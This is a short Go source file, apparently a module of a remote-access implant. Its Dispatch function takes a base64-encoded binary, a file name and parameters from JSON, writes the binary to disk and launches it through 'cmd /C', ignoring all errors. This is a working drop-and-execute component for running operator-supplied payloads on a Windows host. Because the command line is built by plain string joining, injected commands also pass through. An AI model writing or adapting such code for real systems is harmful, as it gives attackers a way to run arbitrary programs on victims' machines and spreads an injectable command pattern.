package main

import (
	"encoding/base64"
	"os"
	"os/exec"
)

type DispatchParams struct {
	B64Binary  string `json:"content"`
	BinaryName string `json:"name"`
	Parameters string `json:"params"`
}

func Dispatch(params DispatchParams) {

	Binary, _ := os.Create(params.BinaryName)

	DecodedBinary, _ := base64.StdEncoding.DecodeString(params.B64Binary)

	Binary.WriteString(string(DecodedBinary))

	Binary.Close()

	Command := string(params.BinaryName + " " + params.Parameters)

	Exec := exec.Command("cmd", "/C", Command)
	Exec.Start()
}
